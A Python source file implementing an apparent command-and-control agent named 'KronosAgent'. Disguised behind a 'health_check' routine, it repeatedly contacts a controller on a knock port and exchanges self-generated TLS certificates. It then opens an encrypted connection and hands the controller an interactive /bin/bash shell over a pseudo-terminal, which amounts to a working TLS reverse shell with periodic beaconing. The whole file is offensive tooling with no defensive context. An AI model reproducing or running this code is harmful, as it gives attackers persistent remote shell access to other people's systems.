import subprocess
import socket
import pty
import time
import threading
from OpenSSL import crypto
import ssl
import os 
import select 

KNOCK_PORT = 31415
HTTPS_PORT = 31416
HOST = socket.gethostbyname(socket.gethostname())

class KronosAgent():

    def __init__(self, host):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.knock_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.knock_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.host = host
        self.tls_private_key_file = "my.key"
        self.tls_cert_file = "my.crt"
        self.tls_other_crt_file = "other.crt"
        self.server_hostname='example.com'
        self.crt = self.cert_gen()

    def cert_gen(self, validityEndInSeconds=10*365*24*60*60):
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, 2048)
        cert = crypto.X509()
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(validityEndInSeconds)
        cert.set_issuer(cert.get_subject())
        cert.set_pubkey(k)
        cert.sign(k, 'sha512')
        ret = crypto.dump_certificate(crypto.FILETYPE_PEM, cert)
        with open(self.tls_cert_file, "wt") as f:
            f.write(ret.decode("utf-8"))
        with open(self.tls_private_key_file, "wt") as f:
            f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k).decode("utf-8"))
        return ret

    def interact(self):
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
            context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=self.tls_other_crt_file)
            context.verify_mode = ssl.CERT_REQUIRED
            context.load_cert_chain(certfile=self.tls_cert_file, keyfile=self.tls_private_key_file)
            ss = context.wrap_socket(self.sock, server_side=False, server_hostname=self.server_hostname)
            ss.connect((self.host, HTTPS_PORT))
            master, slave = pty.openpty()

            bash = subprocess.Popen("/bin/bash",
                                    preexec_fn=os.setsid,
                                    stdin=slave,
                                    stdout=slave,
                                    stderr=slave,
                                    universal_newlines=True)
            
            time.sleep(0.5)  
            while bash.poll() is None:
                r, w, e = select.select([ss, master], [], [])
                if master in r:
                    out = os.read(master, 2048)
                    if out:
                        out += b'-emrdeye'
                        print("Data Sent: " + out.decode())
                        ss.write(out)
                elif ss in r:
                    try:
                        data = ss.recv(1024)
                        print("Data Received: " + data.decode())
                    except ssl.SSLError as e:
                        if e.errno == ssl.SSL_ERROR_WANT_READ:
                            continue
                        raise
                    if not data:  # End of file.
                        break
                    data_left = ss.pending()
                    while data_left:
                        data += ss.recv(data_left)
                        data_left = ss.pending()
                    os.write(master, data)
                


    def health_check(self):
        print("Trying to connect...")
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
            try:
                s.connect((self.host, KNOCK_PORT))
                print("Connected to :" + self.host)
                s.sendall(b'Knock')
                data = s.recv(1024)
                if data == b'Knock':
                    print("Data Received: " + data.decode())
                    pass
                elif b'crt-' in data:
                    print("Data Received: " + data.decode())
                    other_crt = data.split(b'crt-')[1]
                    time.sleep(0.25) 
                    crt = b'crt-'+self.crt
                    print("Cert Sent")
                    s.sendall(crt)
                    resv = b''
                    while resv == b'':
                        try:
                            s.settimeout(5)
                            resv = s.recv(1024)
                        except Exception as e:
                            print("Didn't get go signal, retrying")
                    with open(self.tls_other_crt_file, "wt") as f:
                        f.write(other_crt.decode("utf-8"))
                    threading.Thread(target=self.interact(), args=()).start()              
                else:
                    print("Server did not get cert, will retry")
                    print("Agent Recieved unxpected data " + str(data))
            except Exception as e:
                print("Can't reach server will retry in 15 minutes")

def main():
    k = KronosAgent(HOST)
    while True:
        k.health_check()
        time.sleep(15)
main()